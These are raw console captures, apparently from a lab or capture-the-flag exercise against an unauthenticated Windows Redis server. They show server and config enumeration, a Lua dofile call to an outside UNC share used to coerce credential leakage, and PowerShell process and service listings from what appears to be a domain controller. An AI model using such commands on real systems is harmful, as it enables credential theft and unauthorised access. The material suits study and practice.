
```
10.10.116.41:6379> INFO
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:1448
run_id:2144d2423b812b7a75365111eaee4e171d5815d0
tcp_port:6379
uptime_in_seconds:1583
uptime_in_days:0
hz:10
lru_clock:11731337
config_file:

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:952800
used_memory_human:930.47K
used_memory_rss:919256
used_memory_peak:952800
used_memory_peak_human:930.47K
used_memory_lua:36864
mem_fragmentation_ratio:0.96
mem_allocator:dlmalloc-2.8

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1756560218
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:2
total_commands_processed:3
instantaneous_ops_per_sec:0
total_net_input_bytes:72
total_net_output_bytes:0
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.03
used_cpu_user:0.13
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Keyspace
10.10.116.41:6379>
```

```
10.10.116.41:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
 10) ""
 11) "pidfile"
 12) "/var/run/redis.pid"
 13) "maxmemory"
 14) "0"
 15) "maxmemory-samples"
 16) "3"
 17) "timeout"
 18) "0"
 19) "tcp-keepalive"
 20) "0"
 21) "auto-aof-rewrite-percentage"
 22) "100"
 23) "auto-aof-rewrite-min-size"
 24) "67108864"
 25) "hash-max-ziplist-entries"
 26) "512"
 27) "hash-max-ziplist-value"
 28) "64"
 29) "list-max-ziplist-entries"
 30) "512"
 31) "list-max-ziplist-value"
 32) "64"
 33) "set-max-intset-entries"
 34) "512"
 35) "zset-max-ziplist-entries"
 36) "128"
 37) "zset-max-ziplist-value"
 38) "64"
 39) "hll-sparse-max-bytes"
 40) "3000"
 41) "lua-time-limit"
 42) "5000"
 43) "slowlog-log-slower-than"
 44) "10000"
 45) "latency-monitor-threshold"
 46) "0"
 47) "slowlog-max-len"
 48) "128"
 49) "port"
 50) "6379"
 51) "tcp-backlog"
 52) "511"
 53) "databases"
 54) "16"
 55) "repl-ping-slave-period"
 56) "10"
 57) "repl-timeout"
 58) "60"
 59) "repl-backlog-size"
 60) "1048576"
 61) "repl-backlog-ttl"
 62) "3600"
 63) "maxclients"
 64) "10000"
 65) "watchdog-period"
 66) "0"
 67) "slave-priority"
 68) "100"
 69) "min-slaves-to-write"
 70) "0"
 71) "min-slaves-max-lag"
 72) "10"
 73) "hz"
 74) "10"
 75) "repl-diskless-sync-delay"
 76) "5"
 77) "no-appendfsync-on-rewrite"
 78) "no"
 79) "slave-serve-stale-data"
 80) "yes"
 81) "slave-read-only"
 82) "yes"
 83) "stop-writes-on-bgsave-error"
 84) "yes"
 85) "daemonize"
 86) "no"
 87) "rdbcompression"
 88) "yes"
 89) "rdbchecksum"
 90) "yes"
 91) "activerehashing"
 92) "yes"
 93) "repl-disable-tcp-nodelay"
 94) "no"
 95) "repl-diskless-sync"
 96) "no"
 97) "aof-rewrite-incremental-fsync"
 98) "yes"
 99) "aof-load-truncated"
100) "yes"
101) "appendonly"
102) "no"
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
105) "maxmemory-policy"
106) "volatile-lru"
107) "appendfsync"
108) "everysec"
109) "save"
110) "jd 3600 jd 300 jd 60"
111) "loglevel"
112) "notice"
113) "client-output-buffer-limit"
114) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
115) "unixsocketperm"
116) "0"
117) "slaveof"
118) ""
119) "notify-keyspace-events"
120) ""
121) "bind"
122) ""
10.10.116.41:6379> 
```

```
redis-cli -h 10.10.116.41 -p 6379
10.10.116.41:6379> eval "dofile('//10.8.117.56/test')" 0
(error) ERR Error running script (call to f_82d193bf3f0b9f38538d1d2e9ffdbe905ff5e323): @user_script:1: cannot open //10.8.117.56/test: Permission denied 
10.10.116.41:6379>
```

```
PS C:\Users\enterprise-security\Desktop> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    155      10    15876       2996              3020   0 amazon-ssm-agent                                             
     76       5     2592       1316       0.05   2828   0 cmd                                                          
     80       5      848       1556              1788   0 CompatTelRunner                                              
    147       9     6616       1008       0.08    640   0 conhost                                                      
    153       9     6612       2032              1396   0 conhost                                                      
    148       9     7384       6872       0.39   1736   0 conhost                                                      
    152       9     6612       1900              3596   0 conhost                                                      
    377      15     2808       1672               380   0 csrss                                                        
    163       9     1712         72               456   1 csrss                                                        
    390      32    15284      13224              2372   0 dfsrs                                                        
    185      12     2412       4336              2288   0 dfssvc                                                       
    341      27     7688       3252              2356   0 dns                                                          
    539      22    16288       9868               936   1 dwm                                                          
     49       6     1608          0              1624   1 fontdrvhost                                                  
     49       6     1436        148              1764   0 fontdrvhost                                                  
      0       0       56          8                 0   0 Idle                                                         
    468      25    11304      14096              3292   1 LogonUI                                                      
   1579     154    41756      21408               616   0 lsass                                                        
    489      30    31640       5704              2120   0 Microsoft.ActiveDirectory.WebServices                        
    222      13     2916       1016              2800   0 msdtc                                                        
    129       8     2028        412       0.00   3268   0 nssm                                                         
    129       8     2036        472              3472   0 nssm                                                         
    528      26    65872      51932       1.86   2852   0 powershell                                                   
    142      12    21180        324       0.14   3824   0 redis-server                                                 
      0      13      280       5760                84   0 Registry                                                     
    446      16     4956       5240               592   0 services                                                     
     53       3      512          0               276   0 smss                                                         
    468      22     6012       1160              1520   0 spoolsv                                                      
    160      10     1916       1948              3580   0 SppExtComObj                                                 
    237      11     6368       7944              2404   0 sppsvc                                                       
    176      11    17132       6204              1136   0 ssm-agent-worker                                             
    401      24     8684       5000               308   0 svchost                                                      
    215      12     1716       1688               376   0 svchost                                                      
    542      27     8040       9236               448   0 svchost                                                      
    540      18    14032       9468               680   0 svchost                                                      
    598      17     4768       6992               804   0 svchost                                                      
    633      19     3744       6888               860   0 svchost                                                      
   1739      66    32740      46248               980   0 svchost                                                      
    510      18     4268       3312               988   0 svchost                                                      
    807      45     9432       9044              1040   0 svchost                                                      
    397      32     9844       3176              1200   0 svchost                                                      
    309      11     1988       1684              1404   0 svchost                                                      
    161       8     1432        900              1504   0 svchost                                                      
    192      13     4104      13048              1880   0 svchost                                                      
    162      10     2048       1056              1972   0 svchost                                                      
    201      10     2216       2280              2000   0 svchost                                                      
    161       9     2144       1252              2072   0 svchost                                                      
    422      19    16252      11140              2108   0 svchost                                                      
    177      10     2404       5936              2660   0 svchost                                                      
    205      11     2380      13740              2812   0 svchost                                                      
   1381       0      192        132                 4   0 System                                                       
    228      12     2724      15936              4028   0 taskhostw                                                    
    245      17     2792       2480              2580   0 vds                                                          
    172      11     1556        804               520   0 wininit                                                      
    240      12     2692       1752               504   1 winlogon                                                     
     54       4      720          0              2272   0 wlms                                                         
    223      15     4352      11992               896   0 WmiPrvSE                                                     
    311      13     5744      13056              2544   0 WmiPrvSE                                                     
    175      10     6528       2208              2916   0 WmiPrvSE
```

```
PS C:\Users\enterprise-security\Downloads> Get-Service | Where-Object {$_.Status -eq 'Running'}

Status   Name               DisplayName                           
------   ----               -----------                           
Running  ADWS               Active Directory Web Services         
Running  AmazonSSMAgent     Amazon SSM Agent                      
Running  BFE                Base Filtering Engine                 
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Running  CDPSvc             Connected Devices Platform Service    
Running  CertPropSvc        Certificate Propagation               
Running  CoreMessagingRe... CoreMessaging                         
Running  CryptSvc           Cryptographic Services                
Running  DcomLaunch         DCOM Server Process Launcher          
Running  Dfs                DFS Namespace                         
Running  DFSR               DFS Replication                       
Running  Dhcp               DHCP Client                           
Running  DiagTrack          Connected User Experiences and Tele...
Running  DNS                DNS Server                            
Running  Dnscache           DNS Client                            
Running  DPS                Diagnostic Policy Service             
Running  DsmSvc             Device Setup Manager                  
Running  DsSvc              Data Sharing Service                  
Running  EventLog           Windows Event Log                     
Running  EventSystem        COM+ Event System                     
Running  FontCache          Windows Font Cache Service            
Running  gpsvc              Group Policy Client                   
Running  iphlpsvc           IP Helper                             
Running  Kdc                Kerberos Key Distribution Center      
Running  KeyIso             CNG Key Isolation                     
Running  LanmanServer       Server                                
Running  LanmanWorkstation  Workstation                           
Running  LicenseManager     Windows License Manager Service       
Running  lmhosts            TCP/IP NetBIOS Helper                 
Running  LSM                Local Session Manager                 
Running  mpssvc             Windows Defender Firewall             
Running  MSDTC              Distributed Transaction Coordinator   
Running  NcbService         Network Connection Broker             
Running  Netlogon           Netlogon                              
Running  netprofm           Network List Service                  
Running  NlaSvc             Network Location Awareness            
Running  nsi                Network Store Interface Service       
Running  PlugPlay           Plug and Play                         
Running  PolicyAgent        IPsec Policy Agent                    
Running  Power              Power                                 
Running  ProfSvc            User Profile Service                  
Running  Redis              Redis                                 
Running  RpcEptMapper       RPC Endpoint Mapper                   
Running  RpcSs              Remote Procedure Call (RPC)           
Running  RunScript          RunScript                             
Running  SamSs              Security Accounts Manager             
Running  Schedule           Task Scheduler                        
Running  SENS               System Event Notification Service     
Running  SessionEnv         Remote Desktop Configuration          
Running  ShellHWDetection   Shell Hardware Detection              
Running  Spooler            Print Spooler                         
Running  sppsvc             Software Protection                   
Running  StateRepository    State Repository Service              
Running  SysMain            SysMain                               
Running  SystemEventsBroker System Events Broker                  
Running  TermService        Remote Desktop Services               
Running  Themes             Themes                                
Running  TimeBrokerSvc      Time Broker                           
Running  TokenBroker        Web Account Manager                   
Running  UALSVC             User Access Logging Service           
Running  UmRdpService       Remote Desktop Services UserMode Po...
Running  UserManager        User Manager                          
Running  UsoSvc             Update Orchestrator Service           
Running  vds                Virtual Disk                          
Running  W32Time            Windows Time                          
Running  Wcmsvc             Windows Connection Manager            
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Running  Winmgmt            Windows Management Instrumentation    
Running  WinRM              Windows Remote Management (WS-Manag...
Running  wlidsvc            Microsoft Account Sign-in Assistant   
Running  WLMS               Windows Licensing Monitoring Service  
Running  WpnService         Windows Push Notifications System S...
Running  wuauserv           Windows Update
```
